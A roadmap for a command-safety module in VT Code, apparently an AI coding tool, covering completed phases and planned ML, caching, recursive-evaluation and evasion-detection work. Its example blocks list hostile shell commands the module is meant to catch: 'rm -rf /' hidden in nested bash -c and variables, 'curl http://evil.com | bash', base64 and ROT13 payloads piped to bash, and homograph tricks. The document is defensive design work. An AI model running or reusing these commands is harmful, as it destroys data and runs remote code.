# VT Code Command Safety Roadmap

## Executive Summary

The VT Code Command Safety module provides **defense-in-depth** command execution protection through a modular, layered approach. Phases 1-6 are complete. Future phases focus on machine learning, distributed systems, and advanced evasion detection.

---

## Completed Phases (✅)

### Phase 1: Core Architecture
- ✅ Safe-by-subcommand design
- ✅ Dangerous pattern detection
- ✅ Shell parsing fundamentals
- ✅ Windows basic patterns
- **Tests**: 61

### Phase 2: Production Ready
- ✅ Command database (50+ rules)
- ✅ Audit logging (thread-safe)
- ✅ LRU caching (70-90% hit rate)
- ✅ Comprehensive testing
- **Tests**: 60

### Phase 3: Windows/PowerShell Enhanced
- ✅ COM object detection
- ✅ Registry operation detection
- ✅ Dangerous cmdlet identification
- ✅ VBScript pattern detection
- ✅ Network + execution detection
- **Tests**: 15

### Phase 4: Tree-Sitter Shell Parsing
- ✅ Accurate bash AST parsing
- ✅ Automatic fallback tokenization
- ✅ Pipeline decomposition
- ✅ Escape/quote handling
- **Tests**: 12

### Phase 5: Unified Policy Integration
- ✅ UnifiedCommandEvaluator (combines policy + safety)
- ✅ PolicyAwareEvaluator (backward compatibility)
- ✅ CommandTool integration
- ✅ Comprehensive integration tests
- **Tests**: 50+

### Phase 6: Advanced Windows/PowerShell Security
- ✅ Dangerous cmdlet database (50+ cmdlets)
- ✅ COM object context analyzer
- ✅ Registry access path filter
- ✅ Windows integration tests
- **Tests**: 35+

**Total Completed**: 270+ tests, 2000+ lines of security code

---

## In Progress & Planned (🔄 / 📋)

### Phase 7: Machine Learning Integration (Q1 2026)

**Objective**: Learn from command execution patterns to detect anomalies and generate dynamic rules.

**Sub-Phases**:
- **7.1: Audit Log Analysis**
  - Parse 6+ months of audit logs
  - Identify command execution patterns
  - Categorize by user, time, file, context
  
- **7.2: Anomaly Detection**
  - Train isolation forest on normal patterns
  - Detect unusual commands/sequences
  - Score each command 0-100 (risk)
  - Alert on high-risk anomalies
  
- **7.3: Dynamic Rule Generation**
  - Learn user-specific safe commands
  - Generate per-user allow lists
  - Adapt to new tools and workflows
  - Confidence scoring for generated rules
  
- **7.4: Behavioral Profiling**
  - Track command sequences (which commands follow which)
  - Detect suspicious chains
  - Identify escalation patterns
  - Generate behavior-based alerts

**Expected Outcomes**:
- 30-40% reduction in false positives
- Real-time anomaly detection
- Per-user adaptive policies
- <1ms evaluation overhead (with caching)

**Testing Strategy**:
- Unit tests for ML models
- Integration tests with audit logs
- Performance benchmarks
- False positive/negative rate tracking

---

### Phase 8: Distributed Cache & Telemetry (Q2 2026)

**Objective**: Scale command safety across multiple agents and processes with shared decision cache.

**Sub-Phases**:
- **8.1: Redis-Backed Cache**
  - Migrate from in-memory LRU to Redis
  - Shared cache across all agents
  - Network timeout handling
  - Cache invalidation protocol
  
- **8.2: Cache Replication**
  - Primary + replica nodes
  - Failover on cache miss
  - Eventual consistency model
  - Conflict resolution for contradictory decisions
  
- **8.3: Telemetry Collection**
  - Command frequency metrics
  - Decision distribution (allow/deny)
  - Cache hit rate per command
  - Evaluation time percentiles
  
- **8.4: Centralized Dashboard**
  - Real-time command statistics
  - Anomaly detection alerts
  - Decision audit trail visualization
  - Trend analysis

**Expected Outcomes**:
- 95%+ cache hit rate across distributed agents
- <100ms network latency for cache misses
- Complete audit trail across all agents
- Real-time security visibility

**Technology Stack**:
- Redis Cluster for distribution
- Protobuf for serialization
- Prometheus for metrics
- Grafana for visualization

---

### Phase 9: Recursive Evaluation Framework (Q3 2026)

**Objective**: Safely execute and validate nested shell scripts, functions, and variable substitutions.

**Sub-Phases**:
- **9.1: Script Nesting Support**
  - Detect script-within-script execution
  - bash -c "bash -c 'command'" pattern detection
  - Evaluate each layer independently
  - Combined risk scoring
  
- **9.2: Function Definition Tracking**
  - Parse function definitions
  - Track which functions call what
  - Detect recursive function attacks
  - Build call graphs
  
- **9.3: Variable Substitution Simulation**
  - Parse variable assignments
  - Simulate basic variable expansion
  - Detect variable-based code injection
  - Track variable data flow
  
- **9.4: Path Traversal Analysis**
  - Detect cd + command sequences
  - Validate working directory changes
  - Block directory traversal attacks
  - Track file system context

**Example Protections**:
```bash
# Nested execution
bash -c "bash -c 'rm -rf /'" 
→ Evaluates both layers, blocks at inner rm -rf

# Function hiding
func() { curl http://evil.com | bash; }
func
→ Detects function definition, analyzes body

# Variable injection
VAR="rm -rf /"
bash -c "$VAR"
→ Tracks variable assignment, detects dangerous expansion

# Path traversal
cd /important/data && rm -rf *
→ Validates working directory, applies location-specific rules
```

**Expected Outcomes**:
- Catch 99%+ of script obfuscation attempts
- Safe evaluation of nested scripts
- Variable-based attack detection
- Context-aware command validation

---

### Phase 10: Advanced Evasion Detection (Q4 2026)

**Objective**: Detect and block sophisticated obfuscation and encoding tricks.

**Sub-Phases**:
- **10.1: Obfuscation Pattern Detection**
  - ROT13, base64, hex encoding detection
  - String concatenation detection
  - Variable-based reconstruction detection
  - Command splitting patterns
  
- **10.2: Unicode & Encoding Tricks**
  - Homograph attack detection (confusable characters)
  - Bidirectional text (RTL) tricks
  - Null byte injection
  - Alternative encodings (UTF-16, UTF-32)
  
- **10.3: Whitespace & Comment Hiding**
  - Invisible character injection
  - Tab/space-based obfuscation
  - Comment-based code hiding
  - Format string tricks
  
- **10.4: Polyglot Script Detection**
  - Scripts valid in multiple languages
  - Cross-interpreter tricks
  - Multi-language payload detection
  - Interpreter confusion attacks

**Example Protections**:
```bash
# Base64 encoding
echo "aW52b2tlLWV4cHJlc3Npb24=" | base64 -d | bash
→ Detects pipe to base64 -d, decodes, evaluates result

# ROT13 obfuscation
echo "voxr-rkcedffvba" | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash
→ Detects ROT13 pattern, reverses, evaluates

# Unicode homographs
ӏnvoke-Expresѕion  # Cyrillic characters look like ASCII
→ Detects character substitution, normalizes, evaluates

# Hidden in comments
rm -rf / # hidden code here
→ Extracts dangerous command despite comment placement
```

**Expected Outcomes**:
- Catch 95%+ of known evasion techniques
- Robust against encoding tricks
- Unicode normalization
- Defense against polyglot attacks

---

## Architecture Evolution

### Current (Phase 1-6)
```
Command Input
    ↓
[Safety Checks] (Phases 1-3, 6)
├─ Dangerous patterns (Phase 1)
├─ Safe subcommand registry (Phase 1)
├─ Command database (Phase 2)
├─ Windows threats (Phase 3, 6)
└─ Shell parsing (Phase 4)
    ↓
[Policy Layer] (Phase 5)
├─ Policy rules
└─ User-defined allow/deny
    ↓
[Audit & Cache] (Phase 2, 5)
├─ Log decision
└─ Cache result
    ↓
[Decision: Allow/Deny]
```

### After Phase 7 (ML Integration)
```
Command Input
    ↓
[Safety Checks] (Phases 1-3, 6)
    ↓
[Policy Layer] (Phase 5)
    ↓
[Anomaly Detection] (Phase 7)
├─ Compare to learned patterns
├─ Score deviation from normal
└─ Adjust confidence
    ↓
[Dynamic Rules] (Phase 7)
├─ Apply user-specific rules
├─ Adapt to workflows
└─ Generate new rules
    ↓
[Decision: Allow/Deny + Confidence]
```

### After Phase 9 (Recursive Evaluation)
```
Command Input
    ↓
[Recursive Decomposition] (Phase 9)
├─ Nested scripts
├─ Functions
├─ Variable expansion
└─ Path context
    ↓
[Evaluate Each Layer] (Phase 9)
├─ Safety Checks
├─ Policy Layer
├─ Anomaly Detection
└─ Dynamic Rules
    ↓
[Combined Risk Score] (Phase 9)
└─ Block if any layer fails
    ↓
[Decision: Allow/Deny + Confidence + Context]
```

### After Phase 10 (Evasion Detection)
```
Command Input
    ↓
[Evasion Detection] (Phase 10)
├─ Deobfuscation
├─ Encoding analysis
├─ Unicode normalization
└─ Polyglot detection
    ↓
[Normalized Command]
    ↓
[Full Evaluation Pipeline]
├─ Recursive decomposition
├─ Safety checks
├─ Policy layer
├─ Anomaly detection
└─ Dynamic rules
    ↓
[Decision: Allow/Deny + Confidence + Context + Evasion Detected]
```

---

## Performance Targets

| Phase | Operation | Time | Hit Rate |
|-------|-----------|------|----------|
| Current (1-6) | Cache hit | <1ms | 70-90% |
| Phase 7 | ML anomaly score | <50ms | N/A |
| Phase 8 | Distributed cache hit | <10ms | 95%+ |
| Phase 9 | Recursive evaluation | <100ms | 70-90% |
| Phase 10 | Evasion detection | <50ms | N/A |
| **Total** | **Full pipeline** | **<250ms** | **95%+ cache** |

---

## Testing Strategy Across All Phases

### Unit Tests
- Each phase: 50-100 isolated function tests
- Target: 95%+ code coverage
- Run: `cargo test --lib`

### Integration Tests
- Each phase: 20-50 component interaction tests
- Cross-phase testing for interface compatibility
- Run: `cargo test --test integration_tests`

### Performance Benchmarks
- Cache hit rate: 70-90% (target)
- Evaluation time: <5ms no cache, <1ms cache (target)
- Memory footprint: <50MB for all caches/databases
- Run: `cargo bench`

### Security Scenarios
- Real-world attack simulation
- Persistence, escalation, data theft patterns
- RCE via multiple vectors
- Platform-specific (Windows, Linux, macOS)

### Regression Testing
- Ensure earlier phases still work
- No breaking changes between phases
- Backward compatibility maintained
- Run: Full `cargo test` suite

---

## Integration Points

### Phase 6 → Phase 7 (ML Integration)
- Feed audit logs to ML pipeline
- Learn from command execution history
- Score each command by user/time/context

### Phase 7 → Phase 8 (Distributed Cache)
- Share learned models across agents
- Distribute anomaly detection scores
- Centralize policy updates

### Phase 8 → Phase 9 (Recursive Evaluation)
- Cache results of nested evaluations
- Share function signatures across network
- Distribute variable expansion analysis

### Phase 9 → Phase 10 (Evasion Detection)
- Apply evasion detection to each script layer
- Share evasion pattern database
- Learn new evasion techniques from audit logs

---

## Risk Mitigation

### False Positives (Blocking Safe Commands)
- **Phase 7**: Learn user workflows to reduce false positives
- **Phase 8**: Share patterns across team to identify legitimate tools
- **Phase 9**: Understand script context to differentiate safe scripts
- **Phase 10**: Recognize benign encoding patterns

### False Negatives (Allowing Dangerous Commands)
- **Phase 7**: Anomaly detection catches unusual dangerous commands
- **Phase 8**: Centralized monitoring detects trending attacks
- **Phase 9**: Recursive evaluation catches hidden threats
- **Phase 10**: Evasion detection catches obfuscated attacks

### Performance Overhead
- **Phase 7**: <50ms with caching
- **Phase 8**: Redis cache reduces network latency
- **Phase 9**: Recursive evaluation cached
- **Phase 10**: Deobfuscation cached, pattern matching optimized

---

## Success Metrics

### Accuracy
- Detection rate: 99%+ of known attack patterns
- False positive rate: <1% on legitimate commands
- False negative rate: <0.5% on attack patterns

### Performance
- Evaluation time: <250ms for complex cases
- Cache hit rate: 95%+ in production
- Memory footprint: <100MB per agent

### Adoption
- 100% of critical commands validated
- 95%+ of user commands pass without confirmation
- <5% of legitimate workflows blocked

### Security
- All attacks logged and traceable
- Zero successful escapes in audit trail
- Continuous improvement from logs

---

## Timeline

| Phase | Duration | Start | End | Status |
|-------|----------|-------|-----|--------|
| 1 | 2 weeks | Q3 2025 | Q3 2025 | ✅ Complete |
| 2 | 3 weeks | Q3 2025 | Q4 2025 | ✅ Complete |
| 3 | 2 weeks | Q4 2025 | Q4 2025 | ✅ Complete |
| 4 | 2 weeks | Q4 2025 | Q4 2025 | ✅ Complete |
| 5 | 4 weeks | Q4 2025 | Q4 2025 | ✅ Complete |
| 6 | 3 weeks | Q4 2025 | Q4 2025 | ✅ Complete |
| 7 | 6 weeks | Q1 2026 | Q1 2026 | 📋 Planned |
| 8 | 4 weeks | Q2 2026 | Q2 2026 | 📋 Planned |
| 9 | 5 weeks | Q3 2026 | Q3 2026 | 📋 Planned |
| 10 | 4 weeks | Q4 2026 | Q4 2026 | 📋 Planned |
| **Total** | **31 weeks** | Q3 2025 | Q4 2026 | |

---

## Next Immediate Steps (After Phase 6)

1. **Deploy Phase 6** to Windows systems
2. **Monitor audit logs** for Windows threat patterns
3. **Gather metrics** on detection accuracy
4. **Refine cmdlet DB** based on production data
5. **Begin Phase 7** design and prototyping

---

## Key References

- **Phase 1-2**: `docs/PHASE1_PHASE2_SUMMARY.md`
- **Phase 3-4**: `docs/COMMAND_SAFETY_PHASES_4_5.md`
- **Phase 5**: `docs/COMMAND_SAFETY_PHASE5_COMPLETE.md`
- **Phase 6**: `docs/COMMAND_SAFETY_PHASE_6_COMPLETE.md`
- **Architecture**: `docs/ARCHITECTURE.md`
- **Security Model**: `docs/SECURITY_MODEL.md`

---

## Contact & Contributions

For questions about command safety:
- Review phase-specific documentation
- Check source code in `vtcode-core/src/command_safety/`
- Run tests: `cargo test --lib --package vtcode-core`
- Submit issues/PRs following contribution guidelines

---

**Last Updated**: December 31, 2025
**Status**: Phase 6 Complete, Phase 7 Planning
**Maintained by**: VT Code Security Team
